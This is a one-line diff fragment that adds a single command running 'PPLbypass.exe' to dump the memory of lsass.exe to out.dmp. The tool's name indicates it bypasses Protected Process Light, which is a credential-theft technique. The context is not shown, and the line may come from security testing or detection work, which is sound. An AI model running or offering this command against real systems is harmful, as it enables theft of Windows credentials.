@@ -1,0 +1,1 @@
+PPLbypass.exe -dumpname out.dmp -handle direct -service update -name lsass.exe -mode dump
